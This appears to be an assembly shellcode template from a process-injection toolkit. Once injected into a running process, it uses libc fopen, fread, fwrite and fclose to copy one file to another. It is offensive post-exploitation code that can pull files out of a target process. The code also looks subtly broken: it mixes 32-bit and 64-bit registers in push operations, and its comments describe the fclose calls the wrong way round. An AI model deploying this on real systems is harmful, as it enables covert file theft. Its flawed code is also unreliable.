[FRAGMENT:asminject_libc_fopen.s:FRAGMENT]
[FRAGMENT:asminject_libc_fclose.s:FRAGMENT]
[FRAGMENT:asminject_libc_fread.s:FRAGMENT]
[FRAGMENT:asminject_libc_fwrite.s:FRAGMENT]

	// BEGIN: call LIBC fopen against the source file
	push r11
	push r14
	push ebx
	lea edi, sourcefile[eip]
    lea esi, read_only_string[eip]
	call asminject_libc_fopen
    mov r13, eax          # store file descriptor in r13 rather than a variable to avoid attempts to write to executable memory
	pop ebx
	pop r14
	pop r11
	// END: call LIBC fopen
	
	// BEGIN: call LIBC fopen against the destination file
	push r11
	push r14
	push r13
	push ebx
	lea edi, destfile[eip]
    lea esi, write_only_string[eip]
	call asminject_libc_fopen
    mov r10, eax          # store file descriptor in r10 rather than a variable to avoid attempts to write to executable memory
	pop ebx
	pop r13
	pop r14
	pop r11
	// END: call LIBC fopen

copyLoop:

	// BEGIN: call LIBC fread against the source file
	push r14
	push r13
	push r11
	push r10
	push ebx
	mov ecx, r13	# file descriptor
	mov edx, 256		# number of elements
	mov esi, 1		# element size
	mov edi, arbitrary_read_write_data_address[eip]	# buffer - read/write area allocated earlier
	add edi, 0x1000	# don't overwrite anything else that's in it
	call asminject_libc_fread
    mov r12, eax    # result
	pop ebx
	pop r10
	pop r11
	pop r13
	pop r14
	// END: call LIBC fread
	
	// if no bytes were read (usually end-of-file), processing is complete
	cmp r12, 0
	jle doneCopying
	
	// BEGIN: call LIBC fwrite against the destination file with the number of elements read by fread()
	push r14
	push r13
	push r11
	push r10
	push ebx
	mov ecx, r10	# file descriptor
	mov edx, r12	# number of elements
	mov esi, 1		# element size
	mov edi, arbitrary_read_write_data_address[eip]	# buffer - read/write area allocated earlier
	add edi, 0x1000	# don't overwrite anything else that's in it
	call asminject_libc_fwrite
    mov r12, eax    # result
	pop ebx
	pop r10
	pop r11
	pop r13
	pop r14
	// END: call LIBC fwrite

	jmp copyLoop

doneCopying:

	// close file handles using fclose()
	
	// BEGIN: call LIBC fclose against the destination file
	push r15
	push r14
	push r13
	push r10
	push ebx
	mov edi, r13	# file descriptor
	call asminject_libc_fclose
	pop ebx
	pop r10
	pop r13
	pop r14
	pop r15
	// END: call LIBC fclose
	
	// BEGIN: call LIBC fclose against the source file
	push r15
	push r14
	push r13
	push r10
	push ebx
	mov edi, r10	# file descriptor
	call asminject_libc_fclose
	pop ebx
	pop r10
	pop r13
	pop r14
	pop r15
	// END: call LIBC fclose

SHELLCODE_SECTION_DELIMITER
	
sourcefile:
	.ascii "[VARIABLE:sourcefile:VARIABLE]\0"
	.balign 4

destfile:
	.ascii "[VARIABLE:destfile:VARIABLE]\0"
	.balign 4

read_only_string:
	.ascii "r\0"
	.balign 4

write_only_string:
	.ascii "w\0"
	.balign 4
